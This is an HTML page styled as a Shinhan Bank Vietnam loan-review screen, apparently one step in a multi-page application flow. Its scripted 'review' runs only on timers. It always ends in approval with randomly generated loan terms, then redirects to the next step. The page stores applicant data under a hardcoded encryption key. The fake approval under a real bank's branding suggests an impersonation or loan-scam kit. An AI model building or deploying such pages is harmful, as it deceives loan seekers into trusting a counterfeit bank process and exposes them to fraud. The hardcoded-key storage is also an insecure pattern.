<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Shinhan Bank - Xét Duyệt Hồ Sơ</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" href="https://shinhan.com.vn/favicon.ico">
    
    <!-- Shinhan Design System -->
    <link rel="stylesheet" href="../../configs/shared/shinhan-design-system.css">
    <link rel="stylesheet" href="../../configs/shared/shinhan-components.css">
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
    <script src="debug-console.js"></script>
    <style>
        :root {
            --primary-color: #00468E;
            --secondary-color: #00A859;
            --background-color: #F8F9FC;
            --card-background: #FFFFFF;
            --text-primary: #212529;
            --text-secondary: #5A6A85;
            --border-color: #EAEBEE;
            --border-radius: 12px;
            --shadow-sm: 0 4px 15px rgba(0, 70, 142, 0.07);
            --shadow-lg: 0 10px 30px rgba(0, 70, 142, 0.1);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--background-color);
            color: var(--text-primary);
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .approval-container {
            width: 100%;
            max-width: 700px;
            background: var(--card-background);
            border-radius: var(--border-radius);
            box-shadow: var(--shadow-lg);
            padding: 40px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .approval-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
        }

        .progress-circle {
            width: 180px;
            height: 180px;
            position: relative;
            margin: 0 auto 30px;
        }

        .progress-svg {
            transform: rotate(-90deg);
            filter: drop-shadow(0 4px 8px rgba(0, 70, 142, 0.2));
        }

        .progress-bg {
            fill: none;
            stroke: var(--border-color); 
            stroke-width: 10; 
        }

        .progress-fill {
            fill: none;
            stroke: var(--primary-color); 
            stroke-width: 10;
            stroke-linecap: round;
            stroke-dasharray: 565.48;
            stroke-dashoffset: 565.48;
            transition: stroke-dashoffset 1.2s cubic-bezier(0.4, 0, 0.2, 1);
            filter: drop-shadow(0 2px 4px rgba(0, 70, 142, 0.3));
        }

        .progress-center {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .progress-icon {
            font-size: 2.5rem; 
            color: var(--text-secondary);
            animation: pulse 2s infinite;
            margin-bottom: 10px;
        }

        .progress-text {
            font-size: 2rem;
            font-weight: 700;
            color: var(--primary-color);
        }
        
        .status-display h2 { 
            font-size: 1.5rem; 
            font-weight: 700; 
            color: var(--primary-color); 
            margin-bottom: 8px;
        }

        .status-display p { 
            font-size: 1rem;
            color: var(--text-secondary); 
            font-style: italic;
        }

        .step-items {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 30px; 
        }

        .step-item {
            display: flex; 
            align-items: center;
            padding: 15px 20px;
            background: var(--background-color);
            border-radius: var(--border-radius);
            border: 1px solid var(--border-color);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }
        
        .step-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 70, 142, 0.1), transparent);
            transition: left 0.6s;
        }

        .step-item.active {
            box-shadow: var(--shadow-sm); 
            border-color: var(--primary-color);
            background: rgba(0, 70, 142, 0.02);
        }
        
        .step-item.active::before {
            left: 100%;
        }
        
        .step-item.completed { 
            background-color: #E6F8E8; 
            border-color: var(--secondary-color);
            animation: completedPulse 0.6s ease-out;
        }
        
        .step-icon-item {
            width: 40px; 
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--border-color); 
            color: var(--text-secondary);
            border-radius: 50%; 
            margin-right: 15px;
            transition: var(--transition);
            position: relative;
            z-index: 2;
        }
        
        .step-item.active .step-icon-item { 
            background: var(--primary-color); 
            color: white;
            animation: iconPulse 1s infinite;
        }
        
        .step-item.completed .step-icon-item { 
            background: var(--secondary-color); 
            color: white;
        }

        .step-item.completed .step-icon-item::after {
            content: '✓';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 1.2rem;
            font-weight: 700;
        }

        .step-text {
            text-align: left; 
            flex: 1;
            position: relative;
            z-index: 2;
        }

        .step-title {
            font-size: 1.1rem;
            font-weight: 600; 
            margin-bottom: 2px; 
        }

        .step-status {
            font-size: 0.9rem;
            color: var(--text-secondary); 
        }

        .result-display {
            background: var(--card-background);
            border-radius: var(--border-radius);
            box-shadow: var(--shadow-lg);
            padding: 40px;
            margin-top: 30px;
            text-align: center;
            animation: fadeIn 0.8s ease-out;
            position: relative;
            overflow: hidden;
        }
        
        .result-display::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--secondary-color), #28c76f);
        }
        
        .result-icon-display { 
            font-size: 3rem; 
            color: var(--secondary-color); 
            margin-bottom: 20px;
            animation: successBounce 1s ease-out;
        }

        .result-display h3 {
            font-size: 2rem; 
            font-weight: 700;
            color: var(--secondary-color); 
            margin-bottom: 15px;
        }

        .result-display p {
            font-size: 1.1rem; 
            color: var(--text-secondary); 
            margin-bottom: 30px;
        }

        .result-details {
            background: var(--background-color);
            border-radius: var(--border-radius);
            padding: 20px;
            margin-bottom: 30px;
        }

        .detail-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0; 
            border-bottom: 1px solid var(--border-color);
            transition: var(--transition);
        }

        .detail-item:last-child {
            border-bottom: none;
        }

        .detail-item:hover {
            background: rgba(0, 70, 142, 0.02);
            border-radius: 8px;
            padding: 10px 15px;
            margin: 0 -15px;
        }

        .detail-label {
            font-weight: 500;
            color: var(--text-secondary); 
        }

        .detail-value {
            font-weight: 600; 
            color: var(--primary-color); 
        }

        .continue-button {
            background-color: var(--secondary-color); 
            color: white;
            padding: 12px 30px; 
            font-weight: 600;
            border: none;
            border-radius: 50px; 
            margin-top: 30px; 
            transition: var(--transition);
            position: relative;
            overflow: hidden;
            min-width: 200px;
        }

        .continue-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.6s;
        }

        .continue-button:hover::before {
            left: 100%;
        }

        .continue-button:hover {
            background-color: #008a48; 
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 168, 89, 0.3);
        }

        .continue-button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .hidden { 
            display: none !important; 
        }
        
        .fade-out { 
            animation: fadeOutDown 0.5s forwards; 
        }
        
        .fade-in { 
            animation: fadeInUp 0.5s forwards; 
        }
        
        @keyframes fadeOutDown { 
            from { 
                opacity: 1; 
                transform: translateY(0); 
            } 
            to { 
                opacity: 0; 
                transform: translateY(20px); 
            } 
        }
        
        @keyframes fadeInUp { 
            from { 
                opacity: 0; 
                transform: translateY(20px); 
            } 
            to { 
                opacity: 1; 
                transform: translateY(0); 
            } 
        }
        
        @keyframes pulse { 
            0%, 100% { 
                transform: scale(1); 
            } 
            50% { 
                transform: scale(1.05); 
            } 
        }
        
        @keyframes iconPulse {
            0%, 100% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(0, 70, 142, 0.4);
            }
            50% {
                transform: scale(1.1);
                box-shadow: 0 0 0 10px rgba(0, 70, 142, 0);
            }
        }
        
        @keyframes completedPulse {
            0% {
                transform: scale(1);
                background-color: #E6F8E8;
            }
            50% {
                transform: scale(1.02);
                background-color: #D4F4D8;
            }
            100% {
                transform: scale(1);
                background-color: #E6F8E8;
            }
        }
        
        @keyframes successBounce {
            0% {
                transform: scale(0.3);
                opacity: 0;
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            .approval-container {
                padding: 30px 20px;
                margin: 10px;
            }
            
            .progress-circle {
                width: 150px;
                height: 150px;
            }
            
            .progress-icon {
                font-size: 2rem;
            }
            
            .progress-text {
                font-size: 1.5rem;
            }
            
            .status-display h2 {
                font-size: 1.3rem;
            }
            
            .step-item {
                padding: 12px 15px;
            }
            
            .step-icon-item {
                width: 35px;
                height: 35px;
                margin-right: 12px;
            }
            
            .result-display {
                padding: 30px 20px;
            }
            
            .result-display h3 {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="approval-container">
        <div class="progress-container">
            <div class="progress-circle">
                <svg class="progress-svg" viewBox="0 0 200 200">
                    <circle class="progress-bg" cx="100" cy="100" r="90"></circle>
                    <circle id="progressCircle" class="progress-fill" cx="100" cy="100" r="90"></circle>
                </svg>
                <div class="progress-center">
                    <div id="progressIcon" class="progress-icon"><i class="fas fa-search"></i></div>
                    <div id="progressText" class="progress-text">0%</div>
                </div>
            </div>
        </div>

        <div class="status-display">
            <h2 id="statusText" class="status-text">Đang Xét Duyệt Hồ Sơ</h2>
            <p id="subStatusText" class="sub-status-text">Bắt đầu quy trình thẩm định...</p>
        </div>

        <div class="step-items">
            <div class="step-item" data-step="1">
                <div class="step-icon-item"><i class="fas fa-user-check"></i></div>
                <div class="step-text">
                    <span class="step-title">Kiểm tra thông tin cá nhân</span>
                    <span class="step-status">Chờ xử lý...</span>
                </div>
            </div>
            
            <div class="step-item" data-step="2">
                <div class="step-icon-item"><i class="fas fa-file-alt"></i></div>
                <div class="step-text">
                    <span class="step-title">Xác thực giấy tờ tùy thân</span>
                    <span class="step-status">Chờ xử lý...</span>
                </div>
            </div>
            
            <div class="step-item" data-step="3">
                <div class="step-icon-item"><i class="fas fa-chart-line"></i></div>
                <div class="step-text">
                    <span class="step-title">Đánh giá tín dụng</span>
                    <span class="step-status">Chờ xử lý...</span>
                </div>
            </div>
            
            <div class="step-item" data-step="4">
                <div class="step-icon-item"><i class="fas fa-gavel"></i></div>
                <div class="step-text">
                    <span class="step-title">Quyết định cuối cùng</span>
                    <span class="step-status">Chờ xử lý...</span>
                </div>
            </div>
        </div>

        <div id="resultDisplay" class="result-display hidden">
            <div class="result-icon-display"><i id="resultIcon" class="fas fa-check-circle"></i></div>
            <h3>Xét Duyệt Thành Công!</h3>
            <p>Hồ sơ của bạn đã được phê duyệt</p>
            <div class="result-details">
                <div class="detail-item">
                    <span class="detail-label">Mức vay:</span>
                    <span id="loanAmount" class="detail-value">500,000,000 VNĐ</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Lãi suất:</span>
                    <span id="interestRate" class="detail-value">12.5%/năm</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Thời hạn:</span>
                    <span id="loanTerm" class="detail-value">36 tháng</span>
                </div>
            </div>
            <button id="continueButton" class="continue-button">
                <i class="fas fa-arrow-right"></i> Tiếp tục
            </button>
        </div>
    </div>

<script>
"use strict";

class EnhancedApprovalProcess {
    constructor() {
        this.elements = {
            progressCircle: document.getElementById('progressCircle'),
            progressText: document.getElementById('progressText'),
            progressIcon: document.getElementById('progressIcon'),
            statusText: document.getElementById('statusText'),
            subStatusText: document.getElementById('subStatusText'),
            stepItems: document.querySelectorAll('.step-item'),
            resultDisplay: document.getElementById('resultDisplay'),
            resultIcon: document.getElementById('resultIcon'),
            continueButton: document.getElementById('continueButton')
        };
        
                this.state = { isProcessing: true };
        
        this.reviewSteps = [
            { 
                text: 'Bắt đầu xét duyệt', 
                subText: 'Khởi tạo hệ thống thẩm định...', 
                icon: 'fas fa-search', 
                duration: 2000, 
                progress: 0 
            },
            { 
                text: 'Kiểm tra thông tin cá nhân', 
                subText: 'Xác minh danh tính và thông tin cơ bản...', 
                icon: 'fas fa-user-check', 
                duration: 3000, 
                progress: 25 
            },
            { 
                text: 'Xác thực giấy tờ tùy thân', 
                subText: 'Phân tích và xác minh tính hợp lệ của giấy tờ...', 
                icon: 'fas fa-file-alt', 
                duration: 4000, 
                progress: 50 
            },
            { 
                text: 'Đánh giá tín dụng', 
                subText: 'Phân tích khả năng tài chính và lịch sử tín dụng...', 
                icon: 'fas fa-chart-line', 
                duration: 3500, 
                progress: 75 
            },
            { 
                text: 'Quyết định cuối cùng', 
                subText: 'Hoàn tất quy trình và đưa ra quyết định...', 
                icon: 'fas fa-gavel', 
                duration: 2500, 
                progress: 100 
            }
        ];
        
        this.init();
    }
    
    init() {
        this.initializeSteps();
        this.startProcess();
                this.elements.continueButton.addEventListener('click', this.continueToNextStep.bind(this));
    }
    
    initializeSteps() {
                this.elements.stepItems.forEach(item => {
            item.classList.remove('show', 'active', 'completed');
        });
    }
    
    updateProgressCircle(progress) {
                const circumference = 2 * Math.PI * 90;
        const offset = circumference - (progress / 100) * circumference;
            this.elements.progressCircle.style.strokeDashoffset = offset;
            this.elements.progressText.textContent = Math.round(progress) + '%';
            }
            
            updateStepUI(step, percentage) {
            this.elements.statusText.textContent = step.text;
            this.elements.subStatusText.textContent = step.subText || "";
            this.elements.progressIcon.innerHTML = `<i class="${step.icon}"></i>`;
            this.updateProgressCircle(percentage);
    }
    
    updateStepStatus(stepIndex, status) {
        const stepItem = this.elements.stepItems[stepIndex];
        const stepStatus = stepItem.querySelector('.step-status');
        
        stepItem.classList.remove('active', 'completed');
        
                if (status === 'active') {
                    stepItem.classList.add('active');
                stepStatus.textContent = 'Đang xử lý...';
                } else if (status === 'completed') {
                    stepItem.classList.add('completed');
                stepStatus.textContent = 'Hoàn thành';
        }
    }
    
    processStep(stepIndex) {
        if (stepIndex >= this.reviewSteps.length) {
            this.showResult();
            return;
        }
        
        const step = this.reviewSteps[stepIndex];
        
        setTimeout(() => {
                    this.updateStepUI(step, step.progress);
            this.updateStepStatus(stepIndex, 'active');
            
            const startProgress = stepIndex > 0 ? this.reviewSteps[stepIndex - 1].progress : 0;
            const endProgress = step.progress;
            const duration = step.duration;
            const startTime = performance.now();
            
            const animateProgress = (currentTime) => {
                const elapsed = currentTime - startTime;
                const progress = Math.min(elapsed / duration, 1);
                const easeOutCubic = 1 - Math.pow(1 - progress, 3);
                const currentStepProgress = startProgress + (endProgress - startProgress) * easeOutCubic;
                
                this.updateProgressCircle(currentStepProgress);
                
                if (progress < 1) {
                    requestAnimationFrame(animateProgress);
                } else {
                    this.updateStepStatus(stepIndex, 'completed');
                            // Nếu là bước cuối cùng (Quyết định cuối cùng), chuyển hướng ngay
                            if (stepIndex === this.reviewSteps.length - 1) {
                                console.log('Final step completed, showing result and redirecting...');
                    setTimeout(() => {
                                    this.showResult();
                                    // Chuyển hướng được xử lý trong showResult()
                    }, 800);
                            } else {
                                setTimeout(() => this.processStep(stepIndex + 1), 800);
                            }
                }
            };
            
            requestAnimationFrame(animateProgress);
        }, stepIndex === 0 ? 500 : 1200);
    }
    
    showResult() {
                console.log('Showing result...');
                document.querySelector('.progress-container').classList.add('hidden');
                document.querySelector('.status-display').classList.add('hidden');
                document.querySelector('.step-items').classList.add('hidden');
                
            this.elements.resultDisplay.classList.remove('hidden');
            
            this.elements.progressIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            this.updateProgressCircle(100);
            
                // Generate random loan data
                const loanAmount = Math.floor(Math.random() * 500000000) + 100000000;
                const interestRate = (Math.random() * 5 + 10).toFixed(1);
                const loanTerm = Math.floor(Math.random() * 24) + 12;
                
                document.getElementById('loanAmount').textContent = new Intl.NumberFormat('vi-VN').format(loanAmount) + ' VNĐ';
                document.getElementById('interestRate').textContent = interestRate + '%/năm';
                document.getElementById('loanTerm').textContent = loanTerm + ' tháng';
                
                const resultData = {
                    loanAmount,
                    interestRate,
                    loanTerm,
                    approvedAt: new Date().toISOString(),
                    currentStep: 4,
                    // Thêm dữ liệu cần thiết cho step5
                    monthlyPayment: Math.round(loanAmount * (interestRate / 100 / 12) * Math.pow(1 + (interestRate / 100 / 12), loanTerm) / (Math.pow(1 + (interestRate / 100 / 12), loanTerm) - 1)),
                    totalInterest: Math.round(loanAmount * (interestRate / 100 / 12) * Math.pow(1 + (interestRate / 100 / 12), loanTerm) / (Math.pow(1 + (interestRate / 100 / 12), loanTerm) - 1) * loanTerm - loanAmount),
                    totalRepay: Math.round(loanAmount * (interestRate / 100 / 12) * Math.pow(1 + (interestRate / 100 / 12), loanTerm) / (Math.pow(1 + (interestRate / 100 / 12), loanTerm) - 1) * loanTerm)
                };
                
                console.log('Result data:', resultData);
                
                // Save to localStorage
                try {
                    const storedData = localStorage.getItem('userData');
                    if (storedData) {
                        const decrypted = CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8);
                        const oldUserData = JSON.parse(decrypted);
                        Object.assign(oldUserData, resultData);
                        const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(oldUserData), 'shinhan-secret-key').toString();
                        localStorage.setItem('userData', encryptedData);
                        console.log('Updated existing user data');
                    } else {
                        const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(resultData), 'shinhan-secret-key').toString();
                        localStorage.setItem('userData', encryptedData);
                        console.log('Created new user data');
                    }
                } catch (e) {
                    console.warn('Không thể lưu kết quả vào localStorage:', e);
                }
                
                // Tự động chuyển hướng ngay lập tức sau khi hết thời gian xác thực
                setTimeout(() => {
                    console.log('Auto redirecting to step5.html...');
                    try {
                        window.location.href = 'step5.html';
                    } catch (error) {
                        console.error('Redirect failed, trying replace:', error);
                        window.location.replace('step5.html');
                    }
                }, 1000);
                
                this.state.isProcessing = false;
    }
    
    startProcess() {
                setTimeout(() => this.processStep(0), 1000);
            }
            
            continueToNextStep() {
                console.log('continueToNextStep called');
                this.elements.continueButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang chuyển...';
                this.elements.continueButton.disabled = true;
                
                // Manual redirect through continue button - chuyển hướng ngay lập tức
                setTimeout(() => {
                    console.log('Manual redirect to step5.html...');
                    window.location.href = 'step5.html';
                }, 500);
}

        }

document.addEventListener('DOMContentLoaded', () => {
            new EnhancedApprovalProcess();
            
            // Initialize debug console
            initDebugConsole(4, 'Step 4 - Review');
            
            // Override debug console methods for step 4
            debugConsole.validateStep = function() {
                this.log('Validating review step...', 'info');
                const reviewSteps = document.querySelectorAll('.review-step');
                const progressBar = document.querySelector('.progress-bar');
                
                let isValid = true;
                let message = '';
                
                if (!reviewSteps || reviewSteps.length === 0) {
                    isValid = false;
                    message += 'Review steps not found. ';
                }
                
                if (!progressBar) {
                    isValid = false;
                    message += 'Progress bar not found. ';
                }
                
                const result = isValid ? 'Review validation passed' : 'Review validation failed: ' + message;
                const type = isValid ? 'success' : 'error';
                
                this.log(result, type);
            };
            
            debugConsole.fillTestData = function() {
                this.log('Filling test data for review step...', 'info');
                // Simulate review completion
                const reviewApp = window.ReviewApp;
                if (reviewApp && reviewApp.state) {
                    reviewApp.state.isProcessing = false;
                    reviewApp.state.currentStep = reviewApp.reviewSteps.length - 1;
                    reviewApp.showResult();
                }
                this.log('Test review data filled', 'success');
            };
            
            debugConsole.saveData = function() {
                this.log('Saving review data...', 'info');
                try {
                    const userData = localStorage.getItem('userData');
                    if (userData) {
                        const decrypted = CryptoJS.AES.decrypt(userData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8);
                        const parsed = JSON.parse(decrypted);
                        
                        // Update current step and add review results
                        parsed.currentStep = 5;
                        parsed.reviewCompleted = true;
                        parsed.loanApproved = true;
                        parsed.approvedAmount = parsed.loanAmount;
                        parsed.approvedTerm = parsed.loanTerm;
                        parsed.approvedRate = parsed.interestRate;
                        parsed.timestamp = new Date().toISOString();
                        
                        const encrypted = CryptoJS.AES.encrypt(JSON.stringify(parsed), 'shinhan-secret-key').toString();
                        localStorage.setItem('userData', encrypted);
                        
                        this.log('Review data saved successfully', 'success');
                    } else {
                        this.log('No user data found to save', 'warning');
                    }
                } catch (e) {
                    this.log('Error saving review data: ' + e.message, 'error');
                }
            };
            
            debugConsole.loadData = function() {
                this.log('Loading review data...', 'info');
                try {
                    const userData = localStorage.getItem('userData');
                    if (userData) {
                        const decrypted = CryptoJS.AES.decrypt(userData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8);
                        const parsed = JSON.parse(decrypted);
                        
                        this.log('User data loaded for review', 'info');
                    } else {
                        this.log('No user data found', 'warning');
                    }
                } catch (e) {
                    this.log('Error loading data: ' + e.message, 'error');
                }
            };
});
</script>
</body>
</html>
